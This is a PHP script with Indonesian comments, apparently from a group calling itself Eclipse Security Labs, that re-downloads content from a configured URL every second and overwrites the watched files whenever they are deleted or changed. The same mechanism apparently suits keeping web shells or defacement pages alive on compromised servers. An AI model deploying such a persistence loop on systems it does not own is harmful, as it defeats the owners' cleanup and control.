<?php

/**
 * SCRIPT INI DI BUAT OLEH Eclipse Security Labs Team
 * Memastikan file yang dipantau tidak bisa terhapus atau diubah.
 */

set_time_limit(0);
$interval = 1; // Waktu jeda antar pengecekan dalam detik
$jsonFilePath = './config.json';

function getConfig($jsonFilePath) {
    if (!file_exists($jsonFilePath)) {
        echo "File config json nya ga ada cok $jsonFilePath\n";
        return null;
    }
    $jsonContent = file_get_contents($jsonFilePath);
    $data = json_decode($jsonContent, true);

    if (json_last_error() !== JSON_ERROR_NONE) {
        echo "Error: format nya benerin dulu - " . json_last_error_msg() . "\n";
        return null;
    }

    return $data;
}

function checkAndRestoreFile($filePath, $url) {
    // Unduh konten file dari URL
    $remoteContent = file_get_contents($url);

    if ($remoteContent === false) {
        echo "Gagal mengunduh file dari $url\n";
        return;
    }

    // Jika file tidak ada, pulihkan dari URL
    if (!file_exists($filePath)) {
        if (!file_exists(dirname($filePath))) {
            mkdir(dirname($filePath), 0755, true);
        }
        if (file_put_contents($filePath, $remoteContent)) {
            echo "File $filePath hilang, sudah dipulihkan dari $url\n";
        } else {
            echo "Gagal memulihkan file $filePath dari $url\n";
        }
    } else {
        // Jika file ada, cek apakah kontennya berubah
        $currentContent = file_get_contents($filePath);

        if ($remoteContent !== $currentContent) {
            // Pulihkan jika konten berubah
            if (file_put_contents($filePath, $remoteContent)) {
                echo "Konten file $filePath berubah, sudah dipulihkan dari $url\n";
            } else {
                echo "Gagal memulihkan konten file: $filePath dari $url\n";
            }
        }
    }
}

$config = getConfig($jsonFilePath);

if (!$config) {
    echo "Konfigurasi tidak valid.\n";
    exit;
}

$filesToMonitor = isset($config['path']) ? $config['path'] : [];
$url = isset($config['url']) ? $config['url'] : null;

if (empty($filesToMonitor) || !$url) {
    echo "File yang diawasi atau URL tidak diatur dalam config.json.\n";
    exit;
}

while (true) {
    foreach ($filesToMonitor as $file) {
        checkAndRestoreFile($file, $url);
    }
    sleep($interval);
}
